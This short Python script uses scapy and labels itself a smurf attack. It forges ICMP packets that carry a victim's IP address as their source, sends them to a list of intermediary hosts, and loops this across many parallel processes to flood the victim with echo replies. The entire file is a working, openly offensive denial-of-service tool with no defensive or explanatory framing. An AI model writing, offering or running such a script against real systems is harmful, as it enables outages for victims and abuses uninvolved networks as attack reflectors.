from scapy.all import *
import argparse
from multiprocessing import Pool
 
 
def ddos(args):
    middlemen = args.mids
    victim = args.victim[0]
    print(middlemen, victim)
    for i in range(100000):
        for middleman in middlemen:
            send(IP(src=victim, dst=middleman)/ICMP())
 
 
 
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='sends a smurf attack')
    parser.add_argument("--mids", nargs="+") # the middlemen
    parser.add_argument("victim", nargs=1) # the middlemen
    args = parser.parse_args()

    p = Pool(10)
    p.map(ddos, [args for x in range(1000)])
